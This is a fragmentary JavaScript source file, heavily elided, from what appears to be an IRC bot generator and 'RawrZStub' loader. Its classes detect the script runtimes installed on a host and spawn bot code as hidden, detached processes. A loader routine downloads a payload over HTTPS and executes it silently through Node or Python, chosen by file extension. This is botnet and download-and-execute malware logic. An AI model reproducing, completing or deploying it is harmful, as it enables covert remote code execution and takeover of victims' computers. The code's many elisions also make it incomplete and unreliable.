...
class IRCBotGenerator {
    ...
    constructor() {
        ...
        this.selfSufficient = true; // JavaScript implementation is self-sufficient
    ...
    async detectAvailableRuntimes() {
        ...
        for (const runtime of runtimes) {
            try {
                await this.checkRuntime(runtime.command);
                this.availableRuntimes.set(runtime.name, runtime.command);
                this.externalDependencies.push(runtime.name);
                logger.info(`Runtime available: ${runtime.name}`);
            } catch (error) {
    ...
    async checkRuntime(command) {
        return new Promise((resolve, reject) => {
            ...
            const proc = spawn(command.split(' ')[0], command.split(' ').slice(1), { windowsHide: true });
            proc.on('close', (code) => {
                if (code === 0) {
                    resolve();
                } else {
                    reject(new Error(`Runtime ${command} not available`));
                }
            });
            proc.on('error', () => {
                reject(new Error(`Runtime ${command} not found`));
            });
        });
    }
...
class RawrZStub {
    ...
    executeBotCode(code) {
        ...
        try {
            // Use detected runtime instead of hardcoded 'node'
            const runtime = this.availableRuntimes.get('node') || 'node';
            const runtimeCommand = runtime.split(' ')[0];
            
            const child = spawn(runtimeCommand, [tempFile], {
                detached: true,
                stdio: 'ignore'
            });
            child.unref();
    ...
    // startLoader() {
        ...
        try {
            ...
            const downloadPayload = async () => {
                ...
                // Execute payload using detected runtime
                const { spawn } = require('child_process');
                const runtime = this.availableRuntimes.get('node') || 'node';
                const runtimeCommand = runtime.split(' ')[0];
                
                const child = spawn(runtimeCommand, ['temp_payload.js'], {
                    detached: true,
                    stdio: 'ignore'
                });
                child.unref();
        ...
        try {
            ...
            https.get(url, (response) => {
                ...
                file.on('finish', () => {
                    ...
                    // Execute based on file extension using detected runtimes
                    const { spawn } = require('child_process');
                    if (filename.endsWith('.js')) {
                        const runtime = this.availableRuntimes.get('node') || 'node';
                        const runtimeCommand = runtime.split(' ')[0];
                        spawn(runtimeCommand, [filename], { detached: true, stdio: 'ignore' });
                    } else if (filename.endsWith('.py')) {
                        const runtime = this.availableRuntimes.get('python') || this.availableRuntimes.get('python3') || 'python';
                        const runtimeCommand = runtime.split(' ')[0];
                        spawn(runtimeCommand, [filename], { detached: true, stdio: 'ignore' });
